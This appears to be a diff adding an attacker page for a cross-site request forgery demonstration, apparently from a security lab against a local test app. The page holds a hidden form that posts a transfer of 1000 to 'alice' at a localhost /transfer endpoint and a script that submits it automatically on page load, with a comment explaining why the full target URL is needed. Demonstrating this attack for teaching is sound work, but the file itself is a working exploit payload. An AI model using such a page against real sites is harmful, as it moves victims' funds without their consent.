@@ -1,0 +1,10 @@
+<form method='POST' action='http://localhost:4000/transfer'> <!-- In action we can't simply keep "/transfer" because it will submit it to the /transfer endpoint on the attacker site, which won't do anything
+    So instead we need to copy the entire url and include -->
+        <input name='amount' value="1000"/>
+        <input name='to'  value="alice"/>
+        <input type='submit' value='Send'  />
+    </form>
+
+    <script>
+        document.forms[0].submit()
+    </script>
